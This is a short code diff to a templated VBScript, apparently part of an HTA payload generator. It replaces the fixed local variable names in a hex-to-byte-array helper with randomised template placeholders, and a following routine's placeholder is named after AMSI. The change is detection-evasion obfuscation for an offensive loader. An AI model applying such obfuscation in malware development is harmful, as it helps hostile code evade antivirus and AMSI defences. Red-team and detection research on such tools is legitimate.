@@ -20,11 +20,11 @@ Function {{ v.fn_build_str }}(a)
 End Function
 
 Function {{ v.fn_hex2arr }}(h)
-    Dim n: n = Len(h) \ 2
-    Dim a(): ReDim a(0 To n - 1)
-    Dim i
-    For i = 0 To n - 1: a(i) = CInt("&H" & Mid(h, i * 2 + 1, 2)): Next
-    {{ v.fn_hex2arr }} = a
+    Dim {{ v.hta_lv_hn }}: {{ v.hta_lv_hn }} = Len(h) \ 2
+    Dim {{ v.hta_lv_ha }}(): ReDim {{ v.hta_lv_ha }}(0 To {{ v.hta_lv_hn }} - 1)
+    Dim {{ v.hta_lv_hi }}
+    For {{ v.hta_lv_hi }} = 0 To {{ v.hta_lv_hn }} - 1: {{ v.hta_lv_ha }}({{ v.hta_lv_hi }}) = CInt("&H" & Mid(h, {{ v.hta_lv_hi }} * 2 + 1, 2)): Next
+    {{ v.fn_hex2arr }} = {{ v.hta_lv_ha }}
 End Function
 
 Sub {{ v.fn_amsi }}()
